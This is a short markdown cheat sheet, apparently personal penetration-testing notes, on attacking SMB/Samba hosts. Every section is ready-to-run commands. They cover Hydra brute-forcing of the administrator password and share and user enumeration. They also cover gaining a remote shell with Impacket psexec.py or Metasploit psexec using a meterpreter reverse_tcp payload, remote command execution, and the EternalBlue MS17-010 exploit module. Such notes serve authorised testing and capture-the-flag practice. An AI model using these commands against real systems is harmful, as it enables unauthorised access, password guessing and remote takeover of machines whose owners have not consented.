# SMB/Samba
- Basic nmap scan.
  ```
  nmap -Pn -sV -sC -p445 <ip>
  ```

- Brute-force SMB login.
  ```
  hydra -l administrator -P /usr/share/wordlists/metasploit/unix_passwords.txt <ip> smb
  ```

- List shares.
  ```
  smbclient -L <ip> -U administrator
  
  smbmap -u administrator -p <password> -H <ip>
  
  use auxiliary/scanner/smb/smb_enumshares
  set SMBUser administrator
  set SMBPass <password>
  ```

- List users.
  ```
  enum4linux -u administrator -p <password> -U <ip>
  
  use auxiliary/scanner/smb/smb_enumusers
  set SMBUser administrator
  set SMBPass <password>
  ```

- Get a shell.
  ```
  locate psexec.py
  
  cp /usr/share/doc/python3-impacket/examples/psexec.py ./
  chmod +x psexec.py
  python3 psexec.py administrator@<ip> cmd.exe
  
  use exploit/windows/smb/psexec
  set payload windows/x64/meterpreter/reverse_tcp
  set SMBUser administrator
  set SMBPass <password>
  ```

- Execute command.
  ```
  smbmap -u administrator -p <password> -H <ip> -x ipconfig
  
  python3 psexec.py administrator@<ip> ipconfig
  ```

- EternalBlue
  ```
  use auxiliary/scanner/smb/smb_ms17_010
  
  use exploit/windows/smb/ms17_010_eternalblue
  ```
